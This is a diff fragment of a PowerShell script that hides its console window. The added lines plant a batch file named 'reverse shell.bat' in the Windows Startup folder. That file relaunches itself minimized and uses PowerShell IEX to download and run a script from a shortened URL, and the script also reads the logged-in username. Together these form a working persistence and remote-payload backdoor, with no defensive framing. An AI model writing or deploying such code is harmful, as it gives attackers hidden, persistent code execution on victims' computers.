@@ -8,6 +8,18 @@ public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
 $consolePtr = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($consolePtr, 0)
 
+cd "./appdata/roaming/microsoft/windows/start menu/programs/startup"
+
+New-Item -Path . -Name "reverse shell.bat" -ItemType "file" -Value @"
+@echo off
+if "%1"=="done" goto runtime
+start "" /min %0 done
+exit
+
+:runtime
+powershell IEX (New-Object System.Net.WebClient).DownloadString('http://tinyurl.com/y44v5ltr')
+"@
+
 $ps = "";
 $id = Get-Random
 $username=( ( Get-WMIObject -class Win32_ComputerSystem | Select-Object -ExpandProperty username ) -split '\\' )[1]
